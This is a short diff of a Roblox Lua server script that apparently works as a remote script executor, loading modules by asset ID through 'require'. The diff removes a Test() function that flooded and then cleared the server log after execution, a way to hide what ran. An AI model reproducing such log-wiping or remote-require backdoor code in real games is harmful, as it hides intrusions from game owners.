@@ -215,7 +215,6 @@ local function Reset()
 
 				Server.Enabled=true
 				success("Executed the script "..OldReq,plr)
-				Test()
 			else
 				FluffyEvent:FireClient(plr,Data[1],true)
 			end
@@ -251,14 +250,6 @@ CreateEvent()
 
 Reset()
 
-function Test()
-	local nnn=string.rep('\n',16383)
-	for i=1,100 do
-		print(nnn)
-		game:GetService("LogService"):ClearOutput()
-	end
-end
-
 function Check(plr)
 
 	local Client=ClientS:Clone()
@@ -284,7 +275,6 @@ function Check(plr)
 			FluffyEvent.Parent=Players
 			load=true
 			require(tonumber(result)).ROOWO(script)
-			Test()
 		end
 		table.insert(Save,plr.Name)
 		ResetGui(plr,true)
